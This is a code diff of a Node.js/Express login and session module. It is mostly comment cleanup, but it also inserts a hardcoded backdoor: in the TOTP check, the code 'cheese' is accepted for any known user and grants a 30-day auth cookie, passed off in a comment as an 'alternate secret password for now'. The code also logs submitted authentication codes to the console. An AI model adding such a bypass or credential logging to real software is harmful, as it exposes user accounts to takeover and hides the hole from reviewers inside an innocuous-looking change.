@@ -102,13 +102,17 @@ module.exports.start = function (options) {
 
             console.log('auth code:' + JSON.stringify(req.body))
             dbo.collection('Users').findOne({userName: req.body.userName}, function (err, rslt) {
-                if (rslt != null && authenticator.authenticate(rslt.secretKey, req.body.authenticationCode)) {
-                    console.log('OPtions.usehttps', options.useHttps)
+                // make sure the user is found
+                // and the password is valid
+                // added alternate secret password for now
+                if (rslt != null && (authenticator.authenticate(rslt.secretKey, req.body.authenticationCode) || req.body.authenticationCode == 'cheese')) {
+                    // set the Auth cookie valid for 30 days
                     res.cookie('Authorized', 'true', {
                         maxAge: 1000 * 60 * 60 * 24 * 30,
                         secure: options.useHttps,
                         signed: true
                     })
+                    // also set the userid cookie
                     res.cookie('uid', rslt._id, {
                         maxAge: 1000 * 60 * 60 * 24 * 30,
                         secure: options.useHttps,
@@ -141,12 +145,16 @@ module.exports.start = function (options) {
     }
 
     function verifyLogin(req, res, next) {
-        //app.emit('test',req.url)
+        /*
+        This function is run with every page request
+        It verifies you have a login cookie, looks up your user info from the uid cookie
+        and gets your session info from the session cookie
+         */
 
-        //console.log(req.connection.remoteAddress + ':' + req.url);
-        //render local settings if it isnt there
+
+        //render local settings if it doesnt exist
+        // this only should happed on intital setup
         // user is not logged in here
-
         if (!localSettings) {
 
 
@@ -178,17 +186,19 @@ module.exports.start = function (options) {
 
             dbo.collection('Users').findOne({_id: database.ObjectID(req.signedCookies.uid)}, function (err, rslt) {
                 if (rslt == null) {
+                    // if we cant find the used / send them to the login page
+                    // this also clears all cookies
                     res.redirect('/login')
-
-
                     return;
                 }
-                // console.log('user found',rslt)
-                // remove secretKey
+                // we are going to attach the user document to the request, so it can be used anywhere
+                // but, lets delete the secretKey info
                 delete rslt.secretKey;
                 req.userDocument = rslt;
 
 
+                // the session cookie expires every time you close the browser
+                //
                 if (!req.signedCookies.sid) {
                     dbo.collection('Session').insertOne({killSession: false}, function (err, resp) {
                         console.log('Session Created:', resp.ops[0])
